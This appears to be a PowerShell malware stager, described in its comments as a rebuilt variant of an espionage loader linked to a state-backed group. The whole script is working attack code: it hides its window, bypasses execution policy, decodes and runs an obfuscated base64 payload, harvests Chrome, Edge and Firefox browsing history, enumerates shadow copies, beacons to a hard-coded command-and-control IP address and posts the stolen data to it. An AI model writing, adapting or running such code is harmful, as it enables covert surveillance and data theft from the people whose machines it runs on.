# Stage-2 loader (rebuilt variant) - espionage stager
# Behavior modeled on the Midnight Blizzard-linked "ChocoShell" PowerShell stager
param()

# Hide the console window and neutralize the execution policy for this process
$Host.UI.RawUI.WindowTitle = "svc"
Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass" -ErrorAction SilentlyContinue
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# Decode and run the embedded next stage
$blob = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
$code = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($blob))
Invoke-Expression $code

# Collect browser history (PowerSploit / Empire Read-Navigation lineage)
function Read-Navigation {
    $stores = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History",
        "$env:APPDATA\Mozilla\Firefox\Profiles"
    )
    foreach ($entry in $stores) { Get-Content -Path $entry -ErrorAction SilentlyContinue }
}

# Enumerate Volume Shadow Copies via WMI
$shadows = Get-WmiObject -Query "SELECT * FROM Win32_ShadowCopy"

# Beacon to the staging server tracking pixel, carrying the stage label in the query string
$c2 = "https://91.92.93.94"
$wc = New-Object Net.WebClient
Start-Job -ScriptBlock {
    param($c2,$wc)
    $wc.DownloadString("$c2/t/status.png?r=&m=startup")
    $wc.DownloadString("$c2/t/status.png?m=stage2_ctx_admin_la_true&r=")
    $wc.DownloadString("$c2/t/status.png?m=collecting")
    $wc.DownloadString("$c2/t/status.png?m=key_abe_started")
} -ArgumentList $c2,$wc | Out-Null

# Exfiltrate the collected data over HTTPS POST
$report = Read-Navigation | Out-String
Invoke-RestMethod -Uri "$c2/t/event" -Method Post -Body $report
